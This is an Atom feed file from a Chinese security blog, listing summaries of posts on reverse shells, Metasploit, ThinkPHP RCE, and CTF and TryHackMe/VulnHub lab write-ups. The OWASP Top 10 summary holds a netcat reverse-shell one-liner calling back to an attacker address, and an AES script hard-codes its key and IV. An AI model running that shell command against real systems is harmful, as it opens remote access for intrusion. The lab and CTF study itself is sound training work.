@@ -1,0 +1,584 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+  <title>XingHe</title>
+  
+  <subtitle>XingHeの博客</subtitle>
+  <link href="/atom.xml" rel="self"/>
+  
+  <link href="http://xingher.cn/"/>
+  <updated>2021-06-06T12:03:31.964Z</updated>
+  <id>http://xingher.cn/</id>
+  
+  <author>
+    <name>XingHe</name>
+    
+  </author>
+  
+  <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>CNVD证书获得及要求</title>
+    <link href="http://xingher.cn/posts/19d2d8o8.html"/>
+    <id>http://xingher.cn/posts/19d2d8o8.html</id>
+    <published>2021-05-22T15:32:00.000Z</published>
+    <updated>2021-06-06T12:03:31.964Z</updated>
+    
+    <summary type="html">
+    
+      
+      
+        
+        
+          &lt;h1 id=&quot;前言：&quot;&gt;&lt;a href=&quot;#前言：&quot; class=&quot;headerlink&quot;
+        
+      
+    
+    </summary>
+    
+      <category term="cnvd" scheme="http://xingher.cn/categories/cnvd/"/>
+    
+    
+      <category term="web" scheme="http://xingher.cn/tags/web/"/>
+    
+      <category term="证书" scheme="http://xingher.cn/tags/%E8%AF%81%E4%B9%A6/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>反弹Shell大全与原理</title>
+    <link href="http://xingher.cn/posts/19d2a2lc.html"/>
+    <id>http://xingher.cn/posts/19d2a2lc.html</id>
+    <published>2021-05-13T14:50:03.000Z</published>
+    <updated>2021-06-06T12:09:45.412Z</updated>
+    
+    <summary type="html">
+    
+      
+      
+        
+        
+          &lt;h2 id=&quot;什么是反弹shell&quot;&gt;&lt;a href=&quot;#什么是反弹shell&quot; class=&quot;headerlink&quot; title=&quot;什么是反弹shell&quot;&gt;&lt;/a&gt;什么是反弹shell&lt;/h2&gt;&lt;p&gt;reverse
+        
+      
+    
+    </summary>
+    
+      <category term="工具" scheme="http://xingher.cn/categories/%E5%B7%A5%E5%85%B7/"/>
+    
+    
+      <category term="shell" scheme="http://xingher.cn/tags/shell/"/>
+    
+      <category term="代理" scheme="http://xingher.cn/tags/%E4%BB%A3%E7%90%86/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>edusrc挖掘思路</title>
+    <link href="http://xingher.cn/posts/19d2a2l4.html"/>
+    <id>http://xingher.cn/posts/19d2a2l4.html</id>
+    <published>2021-05-09T12:47:00.000Z</published>
+    <updated>2021-05-09T12:51:12.483Z</updated>
+    
+    <summary type="html">
+    
+      
+      
+        
+        
+          &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot;
+        
+      
+    
+    </summary>
+    
+      <category term="EDUSRC" scheme="http://xingher.cn/categories/EDUSRC/"/>
+    
+    
+      <category term="web" scheme="http://xingher.cn/tags/web/"/>
+    
+      <category term="漏洞" scheme="http://xingher.cn/tags/%E6%BC%8F%E6%B4%9E/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>burp+sqlmap联动</title>
+    <link href="http://xingher.cn/posts/19d2a2m0.html"/>
+    <id>http://xingher.cn/posts/19d2a2m0.html</id>
+    <published>2021-05-04T12:44:00.000Z</published>
+    <updated>2021-05-04T12:54:57.336Z</updated>
+    
+    <summary type="html">
+    
+      
+      
+        
+        
+          &lt;h2 id=&quot;0x00：前言&quot;&gt;&lt;a href=&quot;#0x00：前言&quot; class=&quot;headerlink&quot; title=&quot;0x00：前言&quot;&gt;&lt;/a&gt;0x00：前言&lt;/h2&gt;&lt;p&gt;之前测试 sql
+        
+      
+    
+    </summary>
+    
+      <category term="工具" scheme="http://xingher.cn/categories/%E5%B7%A5%E5%85%B7/"/>
+    
+    
+      <category term="BurpSuite" scheme="http://xingher.cn/tags/BurpSuite/"/>
+    
+      <category term="sqlmap" scheme="http://xingher.cn/tags/sqlmap/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>MSF命令大全详解</title>
+    <link href="http://xingher.cn/posts/19d2a2w8.html"/>
+    <id>http://xingher.cn/posts/19d2a2w8.html</id>
+    <published>2021-05-04T11:19:03.000Z</published>
+    <updated>2021-06-06T12:09:05.408Z</updated>
+    
+    <summary type="html">
+    
+      
+      
+        
+        
+          &lt;h2 id=&quot;1-0-0x00-payload生成：&quot;&gt;&lt;a href=&quot;#1-0-0x00-payload生成：&quot; class=&quot;headerlink&quot; title=&quot;1 | 0     0x00 payload生成：&quot;&gt;&lt;/a&gt;1 | 0     0x00
+        
+      
+    
+    </summary>
+    
+      <category term="工具" scheme="http://xingher.cn/categories/%E5%B7%A5%E5%85%B7/"/>
+    
+    
+      <category term="MSF" scheme="http://xingher.cn/tags/MSF/"/>
+    
+      <category term="命令" scheme="http://xingher.cn/tags/%E5%91%BD%E4%BB%A4/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>解决在深信服 VPN 内无法通过 BurpSuite 进行抓包测试</title>
+    <link href="http://xingher.cn/posts/19d2a2m8.html"/>
+    <id>http://xingher.cn/posts/19d2a2m8.html</id>
+    <published>2021-05-04T11:00:00.000Z</published>
+    <updated>2021-05-04T12:32:02.952Z</updated>
+    
+    <summary type="html">
+    
+      
+      
+        
+        
+          &lt;p&gt;这个情况第一次遇见，感谢同事相助。&lt;/p&gt;
+&lt;p&gt;起因&lt;/p&gt;
+&lt;p&gt;在一次项目中渗透测试，发现拨了入 vpn 之后无法通过 BurpSuite 进行渗透测试，关闭 BurpSuite 单独用浏览器就可以正常访问&lt;br&gt;&lt;img
+        
+      
+    
+    </summary>
+    
+      <category term="问题" scheme="http://xingher.cn/categories/%E9%97%AE%E9%A2%98/"/>
+    
+    
+      <category term="VPN" scheme="http://xingher.cn/tags/VPN/"/>
+    
+      <category term="BurpSuite" scheme="http://xingher.cn/tags/BurpSuite/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>thinkphp5.0和5.1 rce poc总结</title>
+    <link href="http://xingher.cn/posts/19d2a2o8.html"/>
+    <id>http://xingher.cn/posts/19d2a2o8.html</id>
+    <published>2021-05-04T10:32:00.000Z</published>
+    <updated>2021-05-04T10:37:45.417Z</updated>
+    
+    <summary type="html">
+    
+      
+      
+        
+        
+          &lt;p&gt;照搬Sp4ce大神的： &lt;a href=&quot;https://bbs.ichunqiu.com/thread-49591-1-1.html&quot; target=&quot;_blank&quot;
+        
+      
+    
+    </summary>
+    
+      <category term="thinkphp" scheme="http://xingher.cn/categories/thinkphp/"/>
+    
+    
+      <category term="web" scheme="http://xingher.cn/tags/web/"/>
+    
+      <category term="漏洞" scheme="http://xingher.cn/tags/%E6%BC%8F%E6%B4%9E/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>EDUSRC证书</title>
+    <link href="http://xingher.cn/posts/19a2a2e8.html"/>
+    <id>http://xingher.cn/posts/19a2a2e8.html</id>
+    <published>2021-04-01T03:05:00.000Z</published>
+    <updated>2021-06-06T12:04:53.219Z</updated>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;2月份的成果（目前到手，未到还有2）&quot;&gt;&lt;a href=&quot;#2月份的成果（目前到手，未到还有2）&quot; class=&quot;headerlink&quot; title=&quot;2月份的成果（目前到手，未到还有2）&quot;&gt;&lt;/a&gt;2月份的成果（目前到手，未到还有2）&lt;/h2&gt;&lt;p&gt;目前在忙别的事情，博客暂不更新。。。。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20210410195307646.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="EDUSRC" scheme="http://xingher.cn/categories/EDUSRC/"/>
+    
+    
+      <category term="src" scheme="http://xingher.cn/tags/src/"/>
+    
+      <category term="荣誉" scheme="http://xingher.cn/tags/%E8%8D%A3%E8%AA%89/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>ctf中的php序列化与反序列化</title>
+    <link href="http://xingher.cn/posts/69a2a2e8.html"/>
+    <id>http://xingher.cn/posts/69a2a2e8.html</id>
+    <published>2020-12-06T03:05:00.000Z</published>
+    <updated>2021-05-04T12:14:18.898Z</updated>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;ctf中的php序列化与反序列化&quot;&gt;&lt;a href=&quot;#ctf中的php序列化与反序列化&quot; class=&quot;headerlink&quot; title=&quot;ctf中的php序列化与反序列化&quot;&gt;&lt;/a&gt;ctf中的php序列化与反序列化&lt;/h1&gt;&lt;p&gt;  刚开始学的php序列化与反序列化，有点雨里雾里的，于是做个笔记~~&lt;/p&gt;
+&lt;p&gt;首先我们来了解一下概念知道他是怎么样的一个东西：&lt;/p&gt;
+&lt;p&gt;序列化（串行化）：是将变量转换为可保存或传输的字符串的过程；&lt;br&gt;反序列化（反串行化）：就是在适当的时候把这个字符串再转化成原来的变量使用。&lt;br&gt;这两个过程结合起来，可以轻松地存储和传输数据，使程序更具维护性。&lt;/p&gt;
+&lt;p&gt;然后了解魔术方法：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;__construct： 在创建对象时候初始化对象，一般用于对变量赋初值。
+__destruct： 和构造函数相反，当对象所在函数调用完毕后执行。
+__toString：当对象被当做一个字符串使用时调用。
+__sleep:序列化对象之前就调用此方法(其返回需要一个数组)
+__wakeup:反序列化恢复对象之前调用该方法
+__call:当调用对象中不存在的方法会自动调用该方法。
+__get:在调用私有属性的时候会自动执行
+__isset()在不可访问的属性上调用isset()或empty()触发
+__unset()在不可访问的属性上使用unset()时触发&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;常见的方法有前面五个，所以尽量关注前面五个，下面我们看看每个方法的用法以及效果。&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="原理" scheme="http://xingher.cn/categories/%E5%8E%9F%E7%90%86/"/>
+    
+    
+      <category term="CTF" scheme="http://xingher.cn/tags/CTF/"/>
+    
+      <category term="WEB" scheme="http://xingher.cn/tags/WEB/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>AES、RSA密码py脚本</title>
+    <link href="http://xingher.cn/posts/29a2a2e8.html"/>
+    <id>http://xingher.cn/posts/29a2a2e8.html</id>
+    <published>2020-12-01T03:05:00.000Z</published>
+    <updated>2021-05-04T12:15:10.452Z</updated>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;AES密码&quot;&gt;&lt;a href=&quot;#AES密码&quot; class=&quot;headerlink&quot; title=&quot;AES密码&quot;&gt;&lt;/a&gt;AES密码&lt;/h1&gt;&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;# -*- coding: utf-8 -*-
+# @Time : 2020-12-23 8:13
+# @File : AES密码.py
+# @Author : mirror
+# @Software: PyCharm
+
+from Crypto.Cipher import AES
+from binascii import b2a_hex, a2b_hex
+import base64
+
+add = &quot;&quot;
+# 如果text不足16位的倍数就用空格补足为16位
+def add_to_16(text):
+    if len(text.encode(&#39;utf-8&#39;)) % 16 :
+        add = 16 - len(text.encode(&#39;utf-8&#39;)) % 16
+    else:
+        add = 0
+    text = text + (&#39;\0&#39;*add)
+    return text.encode(&#39;utf-8&#39;)
+
+
+# 加密函数
+def encrypt(text):
+    key = &#39;9999999999999999&#39;.encode(&#39;utf-8&#39;)
+    iv = b&#39;qqqqqqqqqqqqqqqq&#39;
+    mode = AES.MODE_CBC
+    cryptor = AES.new(key, mode, iv)
+    text = add_to_16(text)
+    cipher_text = cryptor.encrypt(text)
+    # 因为AES加密后的字符串不一定是ascii字符集的，输出保存可能存在问题，所以这里需要转为16进制字符串
+    return b2a_hex(cipher_text)
+
+
+# 解密后，去掉补足的空格用rstrip() 去掉
+def decrypt(text):
+    key = &#39;9999999999999999&#39;.encode(&#39;utf-8&#39;)
+    iv = b&#39;qqqqqqqqqqqqqqqq&#39;
+    mode = AES.MODE_CBC
+    cryptos = AES.new(key, mode, iv)
+    plain_text = cryptos.decrypt(a2b_hex(text))
+    return bytes.decode(plain_text).rstrip(&#39;\0&#39;)
+
+
+if __name__ == &#39;__main__&#39;:
+    e = encrypt(&quot;hello world&quot;)  # 加密
+    e = base64.b64encode(e)
+    d = base64.b64decode(e)
+    d = decrypt(d)  # 解密
+    print(&quot;加密:&quot;, str(e,encoding=&#39;utf-8&#39;))
+    print(&quot;解密:&quot;, d)&lt;/code&gt;&lt;/pre&gt;
+    
+    </summary>
+    
+      <category term="密码学" scheme="http://xingher.cn/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
+    
+    
+      <category term="AES" scheme="http://xingher.cn/tags/AES/"/>
+    
+      <category term="RSA" scheme="http://xingher.cn/tags/RSA/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>bugku-web</title>
+    <link href="http://xingher.cn/posts/39a2a2e8.html"/>
+    <id>http://xingher.cn/posts/39a2a2e8.html</id>
+    <published>2020-12-01T03:05:00.000Z</published>
+    <updated>2021-05-04T12:14:55.762Z</updated>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;bugku-web&quot;&gt;&lt;a href=&quot;#bugku-web&quot; class=&quot;headerlink&quot; title=&quot;bugku-web&quot;&gt;&lt;/a&gt;bugku-web&lt;/h1&gt;&lt;h1 id=&quot;计算器&quot;&gt;&lt;a href=&quot;#计算器&quot; class=&quot;headerlink&quot; title=&quot;计算器&quot;&gt;&lt;/a&gt;计算器&lt;/h1&gt;&lt;p&gt;修改最大长度&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20201103131812995.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="Bugku" scheme="http://xingher.cn/categories/Bugku/"/>
+    
+    
+      <category term="CTF" scheme="http://xingher.cn/tags/CTF/"/>
+    
+      <category term="WEB" scheme="http://xingher.cn/tags/WEB/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>BUUCTF-crypto(1-29)</title>
+    <link href="http://xingher.cn/posts/59a2a2e8.html"/>
+    <id>http://xingher.cn/posts/59a2a2e8.html</id>
+    <published>2020-12-01T03:05:00.000Z</published>
+    <updated>2021-05-04T12:14:30.140Z</updated>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;BUUCTF-crypto-1-29&quot;&gt;&lt;a href=&quot;#BUUCTF-crypto-1-29&quot; class=&quot;headerlink&quot; title=&quot;BUUCTF-crypto(1-29)&quot;&gt;&lt;/a&gt;BUUCTF-crypto(1-29)&lt;/h1&gt;&lt;h1 id=&quot;MD5&quot;&gt;&lt;a href=&quot;#MD5&quot; class=&quot;headerlink&quot; title=&quot;MD5&quot;&gt;&lt;/a&gt;MD5&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20201110184254145.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="BUUCTF" scheme="http://xingher.cn/categories/BUUCTF/"/>
+    
+    
+      <category term="CTF" scheme="http://xingher.cn/tags/CTF/"/>
+    
+      <category term="CRYPTO" scheme="http://xingher.cn/tags/CRYPTO/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>tryhackme--Wgel CTF</title>
+    <link href="http://xingher.cn/posts/75a2a2j8.html"/>
+    <id>http://xingher.cn/posts/75a2a2j8.html</id>
+    <published>2020-11-27T03:05:00.000Z</published>
+    <updated>2021-05-04T12:10:54.827Z</updated>
+    
+    <summary type="html">
+    
+      &lt;p&gt;这个靶机涉及的知识点有ssh的公钥算法知识和sudo提权常用手法。&lt;/p&gt;
+&lt;h1 id=&quot;nmap&quot;&gt;&lt;a href=&quot;#nmap&quot; class=&quot;headerlink&quot; title=&quot;nmap&quot;&gt;&lt;/a&gt;nmap&lt;/h1&gt;&lt;p&gt;简单扫描靶机的服务&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;nmap -T4 -sS -sV 10.10.247.24&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20201023223030736.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center&quot; alt=&quot;&quot;&gt;)深度扫描也没没有什么可以直接利用的漏洞&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="tryhackme" scheme="http://xingher.cn/categories/tryhackme/"/>
+    
+    
+      <category term="WEB" scheme="http://xingher.cn/tags/WEB/"/>
+    
+      <category term="靶机" scheme="http://xingher.cn/tags/%E9%9D%B6%E6%9C%BA/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>XCTF web新手区wp</title>
+    <link href="http://xingher.cn/posts/7wa2h2e8.html"/>
+    <id>http://xingher.cn/posts/7wa2h2e8.html</id>
+    <published>2020-11-26T03:05:00.000Z</published>
+    <updated>2021-05-04T12:10:04.834Z</updated>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;XCTF-web新手区wp&quot;&gt;&lt;a href=&quot;#XCTF-web新手区wp&quot; class=&quot;headerlink&quot; title=&quot;XCTF web新手区wp&quot;&gt;&lt;/a&gt;XCTF web新手区wp&lt;/h1&gt;&lt;p&gt;1、view_source&lt;/p&gt;
+&lt;p&gt;F12查看页面源码，发现flag。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/2020110221332942.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="XCTF" scheme="http://xingher.cn/categories/XCTF/"/>
+    
+    
+      <category term="CTF" scheme="http://xingher.cn/tags/CTF/"/>
+    
+      <category term="WEB" scheme="http://xingher.cn/tags/WEB/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>tryhackme--OWASP Top 10</title>
+    <link href="http://xingher.cn/posts/75a2a2a8.html"/>
+    <id>http://xingher.cn/posts/75a2a2a8.html</id>
+    <published>2020-11-26T03:05:00.000Z</published>
+    <updated>2021-06-06T12:07:16.654Z</updated>
+    
+    <summary type="html">
+    
+      &lt;p&gt;前面四个Task直接点完成即可，都是一些介绍&lt;br&gt;直接访问题目说的： &lt;a href=&quot;http://10.10.141.123/evilshell.php页面，是一个命令执行的页面。&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://10.10.141.123/evilshell.php页面，是一个命令执行的页面。&lt;/a&gt;&lt;br&gt;先反弹一个shell，要不然操作不方便&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.9.xx.xx 4444 &amp;gt;/tmp/f  #服务器
+nc -lvp 4444   #攻击机&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&quot;Task-5-Severity-1-Command-Injection-Practical&quot;&gt;&lt;a href=&quot;#Task-5-Severity-1-Command-Injection-Practical&quot; class=&quot;headerlink&quot; title=&quot;Task 5  [Severity 1] Command Injection Practical&quot;&gt;&lt;/a&gt;Task 5  [Severity 1] Command Injection Practical&lt;/h1&gt;&lt;p&gt;发现Task5的问题和上一篇博文是一模一样的，那我们就来简单复习一下&lt;/p&gt;
+&lt;h2 id=&quot;What-strange-text-file-is-in-the-website-root-directory&quot;&gt;&lt;a href=&quot;#What-strange-text-file-is-in-the-website-root-directory&quot; class=&quot;headerlink&quot; title=&quot;What strange text file is in the website root directory?&quot;&gt;&lt;/a&gt;What strange text file is in the website root directory?&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;ls -al
+drpepper.txt&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&quot;How-many-non-root-non-service-non-daemon-users-are-there&quot;&gt;&lt;a href=&quot;#How-many-non-root-non-service-non-daemon-users-are-there&quot; class=&quot;headerlink&quot; title=&quot;How many non-root/non-service/non-daemon users are there?&quot;&gt;&lt;/a&gt;How many non-root/non-service/non-daemon users are there?&lt;/h2&gt;
+    
+    </summary>
+    
+      <category term="tryhackme" scheme="http://xingher.cn/categories/tryhackme/"/>
+    
+    
+      <category term="WEB" scheme="http://xingher.cn/tags/WEB/"/>
+    
+      <category term="靶机" scheme="http://xingher.cn/tags/%E9%9D%B6%E6%9C%BA/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>vulnub-Five86-1</title>
+    <link href="http://xingher.cn/posts/7wa8a2e8.html"/>
+    <id>http://xingher.cn/posts/7wa8a2e8.html</id>
+    <published>2020-11-26T03:05:00.000Z</published>
+    <updated>2021-05-04T12:10:21.395Z</updated>
+    
+    <summary type="html">
+    
+      &lt;p&gt;靶机地址: &lt;a href=&quot;https://www.vulnhub.com/entry/five86-1,417/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.vulnhub.com/entry/five86-1,417/&lt;/a&gt;.&lt;/p&gt;
+&lt;h1 id=&quot;namp&quot;&gt;&lt;a href=&quot;#namp&quot; class=&quot;headerlink&quot; title=&quot;namp&quot;&gt;&lt;/a&gt;namp&lt;/h1&gt;&lt;p&gt;使用nmap对进行探测，得到靶机的ip&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;nmap 192.168.88.0/24 -T4&lt;/code&gt;&lt;/pre&gt;&lt;p&gt; &lt;img src=&quot;https://img-blog.csdnimg.cn/20200601170350449.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70&quot; alt=&quot;&quot;&gt;再用nmap进行更详细的探测，发现以下三个端口以及对应的服务。&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="vulnhub" scheme="http://xingher.cn/categories/vulnhub/"/>
+    
+    
+      <category term="WEB" scheme="http://xingher.cn/tags/WEB/"/>
+    
+      <category term="靶机" scheme="http://xingher.cn/tags/%E9%9D%B6%E6%9C%BA/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>tryhackme--Overpass</title>
+    <link href="http://xingher.cn/posts/75a4a2e8.html"/>
+    <id>http://xingher.cn/posts/75a4a2e8.html</id>
+    <published>2020-11-25T03:05:00.000Z</published>
+    <updated>2021-05-04T12:12:12.017Z</updated>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;tryhackme–Overpass&quot;&gt;&lt;a href=&quot;#tryhackme–Overpass&quot; class=&quot;headerlink&quot; title=&quot;tryhackme–Overpass&quot;&gt;&lt;/a&gt;tryhackme–Overpass&lt;/h1&gt;&lt;p&gt;用nmap扫描主机，因为前面我已经简单扫过开放的端口了，所以我现在直接放上详细扫描的贴图和命令&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;nmap -T4 -sS -sV 10.10.220.203 -sC -p 22,80&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20201116214150967.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center&quot; alt=&quot;&quot;&gt;&lt;br&gt;扫描得到的目录&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="tryhackme" scheme="http://xingher.cn/categories/tryhackme/"/>
+    
+    
+      <category term="WEB" scheme="http://xingher.cn/tags/WEB/"/>
+    
+      <category term="靶机" scheme="http://xingher.cn/tags/%E9%9D%B6%E6%9C%BA/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>vulnhub-dc-2</title>
+    <link href="http://xingher.cn/posts/7wa2a2e8.html"/>
+    <id>http://xingher.cn/posts/7wa2a2e8.html</id>
+    <published>2020-11-25T03:05:00.000Z</published>
+    <updated>2021-05-04T12:10:38.578Z</updated>
+    
+    <summary type="html">
+    
+      &lt;p&gt;vulnhub第三个靶机&lt;/p&gt;
+&lt;p&gt;靶机地址：链接: &lt;a href=&quot;https://www.vulnhub.com/entry/dc-2,311/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.vulnhub.com/entry/dc-2,311/&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;知识点&lt;/p&gt;
+&lt;h1 id=&quot;nmap&quot;&gt;&lt;a href=&quot;#nmap&quot; class=&quot;headerlink&quot; title=&quot;nmap&quot;&gt;&lt;/a&gt;nmap&lt;/h1&gt;&lt;p&gt;使用nmap扫描局域网内存活的主机，发现靶机ip&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;nmap 192.168.88.0/24 -T4&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20200602081506156.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70&quot; alt=&quot;&quot;&gt;&lt;br&gt;用nmap对其进行更详细的探测,发现开放了&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="vulnhub" scheme="http://xingher.cn/categories/vulnhub/"/>
+    
+    
+      <category term="WEB" scheme="http://xingher.cn/tags/WEB/"/>
+    
+      <category term="靶机" scheme="http://xingher.cn/tags/%E9%9D%B6%E6%9C%BA/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>tryhackme--Overpass 2 - Hacked</title>
+    <link href="http://xingher.cn/posts/75a2a8e8.html"/>
+    <id>http://xingher.cn/posts/75a2a8e8.html</id>
+    <published>2020-11-24T03:05:00.000Z</published>
+    <updated>2021-05-04T12:11:57.333Z</updated>
+    
+    <summary type="html">
+    
+      &lt;p&gt;日常一篇博客&lt;del&gt;~&lt;/del&gt;&lt;/p&gt;
+&lt;p&gt;今天分享的是tryhackme的一道取证题。&lt;/p&gt;
+&lt;h1 id=&quot;Task-1-Forensics-Analyse-the-PCAP&quot;&gt;&lt;a href=&quot;#Task-1-Forensics-Analyse-the-PCAP&quot; class=&quot;headerlink&quot; title=&quot;Task 1 -Forensics - Analyse the PCAP&quot;&gt;&lt;/a&gt;Task 1 -Forensics - Analyse the PCAP&lt;/h1&gt;&lt;h2 id=&quot;1-What-was-the-URL-of-the-page-they-used-to-upload-a-reverse-shell&quot;&gt;&lt;a href=&quot;#1-What-was-the-URL-of-the-page-they-used-to-upload-a-reverse-shell&quot; class=&quot;headerlink&quot; title=&quot;#1 What was the URL of the page they used to upload a reverse shell?&quot;&gt;&lt;/a&gt;#1 What was the URL of the page they used to upload a reverse shell?&lt;/h2&gt;&lt;p&gt;查看http数据包，我们从请求和响应可以知道攻击者的ip：192.168.170.145，服务器的ip：192.168.170.159，并且/development/目录上还有一个upload.php,故答案&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;/development/&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20201105124627675.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="tryhackme" scheme="http://xingher.cn/categories/tryhackme/"/>
+    
+    
+      <category term="WEB" scheme="http://xingher.cn/tags/WEB/"/>
+    
+      <category term="取证" scheme="http://xingher.cn/tags/%E5%8F%96%E8%AF%81/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>tryhackme--Injection</title>
+    <link href="http://xingher.cn/posts/75a3a2e8.html"/>
+    <id>http://xingher.cn/posts/75a3a2e8.html</id>
+    <published>2020-11-23T03:05:00.000Z</published>
+    <updated>2021-05-04T12:12:23.574Z</updated>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;tryhackme–Injection&quot;&gt;&lt;a href=&quot;#tryhackme–Injection&quot; class=&quot;headerlink&quot; title=&quot;tryhackme–Injection&quot;&gt;&lt;/a&gt;tryhackme–Injection&lt;/h1&gt;&lt;p&gt;开启环境，用nmap扫描，扫出22，80端口，访问80端口发现一个输入框，可以绕过执行任意命令。&lt;br&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20201112102654731.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="tryhackme" scheme="http://xingher.cn/categories/tryhackme/"/>
+    
+    
+      <category term="WEB" scheme="http://xingher.cn/tags/WEB/"/>
+    
+      <category term="靶机" scheme="http://xingher.cn/tags/%E9%9D%B6%E6%9C%BA/"/>
+    
+  </entry>
+  
+</feed>
